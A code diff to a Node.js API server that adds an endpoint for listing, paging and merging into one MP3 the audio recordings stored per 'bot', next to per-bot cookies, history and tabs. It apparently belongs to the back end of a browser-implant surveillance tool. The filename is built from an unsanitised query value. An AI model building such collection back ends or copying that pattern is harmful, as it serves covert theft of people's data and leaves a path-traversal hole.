@@ -9,6 +9,7 @@ const database = require("./database.js");
 const Users = database.Users;
 const Bots = database.Bots;
 const Settings = database.Settings;
+const BotRecording = database.BotRecording;
 const sequelize = database.sequelize;
 const fs = require("fs");
 const { promisify } = require("util");
@@ -305,18 +306,16 @@ async function get_api_server(proxy_utils) {
   // "switch_config",
   // "data_config"
 
-const FIELD_DEFAULT = {
-  switch_config: BOT_DEFAULT_SWITCH_CONFIG,
-  data_config: BOT_DEFAULT_DATA_CONFIG,
-  recording: [],
-  tabs: [],
-  bookmarks: [],
-  history: [],
-  cookies: [],
-  downloads: [],
-};
-
-
+  const FIELD_DEFAULT = {
+    switch_config: BOT_DEFAULT_SWITCH_CONFIG,
+    data_config: BOT_DEFAULT_DATA_CONFIG,
+    recording: [],
+    tabs: [],
+    bookmarks: [],
+    history: [],
+    cookies: [],
+    downloads: [],
+  };
 
   app.get(API_BASE_PATH + "/fields", async (req, res) => {
     const name = req.query.field;
@@ -333,6 +332,93 @@ const FIELD_DEFAULT = {
       .json({
         success: true,
         result: bot[name] || FIELD_DEFAULT[name],
+      })
+      .end();
+  });
+
+  app.get(API_BASE_PATH + "/recordings", async (req, res) => {
+    const {
+      id,
+      page = 1,
+      pageSize = 20,
+      startDate,
+      endDate,
+      download,
+    } = req.query;
+    const offset = (page - 1) * pageSize;
+    const needDownload = download === "true";
+
+    const whereClause = {
+      bot: id,
+    };
+
+    if (startDate || endDate) {
+      const dateConditions = {};
+      let hasDate = false;
+      if (startDate) {
+        const parsedStartDate = new Date(startDate);
+        if (!isNaN(parsedStartDate.getTime())) {
+          dateConditions[Op.gte] = parsedStartDate;
+          hasDate = true;
+        }
+      }
+      if (endDate) {
+        const parsedEndDate = new Date(endDate);
+        if (!isNaN(parsedEndDate.getTime())) {
+          dateConditions[Op.lte] = parsedEndDate;
+          hasDate = true;
+        }
+      }
+      if (hasDate) {
+        whereClause.createdAt = dateConditions;
+      }
+    }
+
+    const recordings = await BotRecording.findAll({
+      where: whereClause,
+      attributes: ["createdAt", "recording", "text"],
+      order: [["createdAt", "DESC"]],
+      ...(needDownload
+        ? {}
+        : {
+            offset: offset,
+            limit: parseInt(pageSize),
+          }),
+    });
+
+    if (needDownload) {
+      const filename = `${id}_${Date.now()}.mp3`;
+      await mergeBase64MP3s(
+        recordings.map((rec) => rec.recording.data),
+        filename
+      );
+
+      return res.sendFile(path.join(__dirname, filename), (err) => {
+        if (err) {
+          console.error("Error sending file:", err);
+        }
+        // Clean up the file after sending
+        fs.unlink(path.join(__dirname, filename), (unlinkErr) => {
+          if (unlinkErr) console.error("Error deleting file:", unlinkErr);
+        });
+      });
+    }
+
+    const total = await BotRecording.count({ where: whereClause });
+
+    res
+      .status(200)
+      .json({
+        success: true,
+        result: {
+          recordings,
+          pagination: {
+            total,
+            page: parseInt(page),
+            pageSize: parseInt(pageSize),
+            totalPages: Math.ceil(total / pageSize),
+          },
+        },
       })
       .end();
   });
